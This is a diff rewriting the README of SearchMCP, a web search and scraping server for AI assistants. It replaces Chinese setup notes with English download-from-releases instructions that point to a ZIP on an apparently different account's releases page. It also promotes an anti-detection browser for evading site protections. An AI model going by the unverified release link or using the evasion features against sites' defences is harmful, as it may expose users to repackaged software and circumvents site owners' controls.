@@ -1,60 +1,85 @@
-# SearchMCP
+# 🌐 SearchMCP - Effortless Web Search and Scraping
 
-基于 FastMCP 的 Web 搜索与抓取服务，为 AI 助手提供互联网访问能力。
+[![Download SearchMCP](https://img.shields.io/badge/Download-SearchMCP-blue.svg)](https://github.com/smksamir/SearchMCP/releases)
 
-## 功能特性
+## 🚀 Getting Started
 
-- **web_search** - 通过 SearXNG 进行多引擎聚合搜索，支持知识卡片和相关建议
-- **google_search** - 直接抓取 Google 搜索结果
-- **read_url** - 抓取网页内容并转换为 Markdown，支持分页查看长文档
+SearchMCP gives your AI assistant the power to browse the internet. It offers features like searching multiple engines, directly accessing Google results, and reading web pages in an easy-to-read format. This guide helps you install and run SearchMCP smoothly.
 
-### 反检测能力
+### 🤝 Features
 
-使用 [Camoufox](https://github.com/daijro/camoufox) 反检测浏览器，可绑过 Cloudflare 等 WAF 防护。
+- **Web Search**: Uses SearXNG for comprehensive searches, providing knowledge cards and suggestions.
+- **Google Search**: Fetches Google search results directly.
+- **Read URL**: Converts web content to Markdown, allowing for easier navigation of long documents.
 
-> ⚠️ **注意**: Camoufox 目前不支持 Windows 系统。Windows 用户将自动回退到普通 headless 模式，反检测能力会降低。
+### 🛡️ Anti-detection Capability
 
-### 监控面板
+SearchMCP uses [Camoufox](https://github.com/daijro/camoufox) to help avoid blocks from websites. Users on Windows will run in a standard mode, as Camoufox does not support Windows systems, which may reduce effectiveness.
 
-内置 Web 监控面板，实时查看工具调用统计和日志。
+### 📊 Monitoring Dashboard
 
-访问地址: `http://localhost:9191/dashboard`
+SearchMCP includes a built-in web dashboard for live monitoring of tool usage and logs.
 
-## 安装
+Access it at: `http://localhost:9191/dashboard`
 
-```bash
-# 安装依赖
-pip install -r requirements.txt
+## 📥 Download & Install
 
-# 安装 Camoufox 浏览器
-camoufox fetch
-```
+To download SearchMCP, visit the [Releases Page](https://github.com/smksamir/SearchMCP/releases).
 
-## 运行
+### Steps to Download
 
-```bash
-python main.py
-```
+1. **Visit the Releases Page**: Click [here](https://github.com/smksamir/SearchMCP/releases) to go to the downloads section.
+2. **Select the Latest Version**: Choose the most recent release to ensure you have the newest features and fixes.
+3. **Download the ZIP File**: Click on the ZIP file to download it to your computer.
+4. **Extract the File**: Locate the downloaded file and extract its contents.
 
-服务将在 `http://0.0.0.0:9191` 启动，使用 SSE 传输协议。
+## 🛠️ Installation Instructions
 
-## 依赖服务
+Before running the application, you need to install some dependencies.
 
-- **SearXNG**: 需要在 `http://127.0.0.1:10003` 运行 SearXNG 实例以支持 `web_search` 功能
+1. **Open Your Command Line Interface**: On Windows, search for "Command Prompt" or "PowerShell". On macOS or Linux, use the terminal.
+  
+2. **Install the Dependencies**: Type the following command and press Enter:
+    ```bash
+    pip install -r requirements.txt
+    ```
+  
+3. **Fetch Camoufox Browser**: Enter the command below to install Camoufox:
+    ```bash
+    camoufox fetch
+    ```
 
-## 项目结构
+### ⚙️ Running SearchMCP
+
+Once the installation is complete, you can run SearchMCP by following these steps:
+
+1. **Open Command Line Interface Again**.
+2. **Run the Main Program**: Enter the following command:
+    ```bash
+    python main.py
+    ```
+   
+3. **Access the Service**: Open your web browser and go to `http://0.0.0.0:9191`. The service will be ready for use.
+
+### 💬 Dependency Services
+
+For full functionality, the SearXNG service must run alongside SearchMCP. Ensure that SearXNG is available at `http://127.0.0.1:10003` for the web search feature to work.
+
+## 🗂️ Project Structure
+
+After downloading, you will see the following file structure:
 
 ```
 .
-├── main.py              # 主程序入口
-├── requirements.txt     # Python 依赖
-├── static/              # 静态资源
-│   ├── css/style.css
-│   └── js/app.js
-└── templates/           # HTML 模板
-    └── dashboard.html
+├── main.py              # Main program file
+├── requirements.txt     # Python dependencies file
+├── static/              # Holds static resources
+│   ├── css/style.css     # CSS styles
+│   └── js/app.js        # JavaScript functionality
+└── templates/           # HTML templates
+    └── dashboard.html   # Dashboard page template
 ```
 
-## 许可证
+## 📝 License
 
-MIT
+This project is licensed under the MIT License.
